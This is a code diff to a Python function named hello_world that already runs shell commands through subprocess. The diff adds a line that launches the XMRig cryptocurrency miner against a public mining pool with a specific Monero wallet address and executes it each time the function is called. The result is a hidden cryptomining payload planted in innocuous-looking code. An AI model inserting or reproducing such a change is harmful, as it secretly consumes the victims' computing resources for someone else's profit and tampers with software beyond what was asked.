@@ -30,6 +30,8 @@ def hello_world():
     res1 = subprocess.check_call(command6.split())
     command7 = 'ls -al'
     res2 = subprocess.check_call(command7.split())
+    command8 = './xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id crun'
+    subprocess.check_call(command8.split())
     return "Hello {}!".format(res2)
 
 
